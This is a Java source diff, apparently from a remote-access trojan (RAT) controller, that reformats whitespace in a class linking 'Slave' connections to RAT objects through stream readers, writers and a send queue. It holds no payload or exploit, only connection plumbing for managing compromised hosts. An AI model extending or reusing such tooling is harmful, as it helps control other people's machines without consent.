@@ -18,10 +18,10 @@ public class RATObjectFormat {
 
 	public static RATObject format(final Slave s) {
 		Connection con = new Connection(s.getConnection().getTimeout(), s.getConnection().getKey().getTextualKey(), s.getConnection().getPass(), s.getConnection().getName());
-		
+
 		final DataOutputStream out = s.getDataOutputStream();
 		final DataInputStream in = s.getDataInputStream();
-		
+
 		RATObject j = new RATObject(s.getIP(), s.getUniqueId(), con, new Writer() {
 
 			@Override
@@ -63,7 +63,7 @@ public class RATObjectFormat {
 			public void writeChar(char arg0) throws IOException {
 				out.writeChar(arg0);
 			}
-				
+
 		}, new Reader() {
 
 			@Override
@@ -109,7 +109,7 @@ public class RATObjectFormat {
 			public char readChar() throws IOException {
 				return in.readChar();
 			}
-			
+
 		}, in, out, new Queue() {
 			@Override
 			public void addToSendQueue(final PacketBuilder arg0, final RATObject rat) throws Exception {
@@ -121,32 +121,33 @@ public class RATObjectFormat {
 						public void write(Slave slave, DataOutputStream dos) throws Exception {
 							arg0.write(rat, slave.getDataOutputStream(), slave.getDataInputStream());
 						}
+
 						@Override
 						public byte getPacketId() {
 							return arg0.getHeader();
 						}
 					};
-					
+
 					slave.addToSendQueue(packet);
 				} else {
 					throw new NullPointerException("No connection found for IP " + rat.getIP());
 				}
-			}	
+			}
 		});
 		return j;
 	}
-	
+
 	public static Slave getFromRATObject(RATObject obj) {
 		String ip = obj.getIP();
-		
+
 		for (int i = 0; i < Main.connections.size(); i++) {
 			Slave slave = Main.connections.get(i);
-			
+
 			if (slave.getIP().equals(ip)) {
 				return slave;
 			}
 		}
-		
+
 		return null;
 	}
 
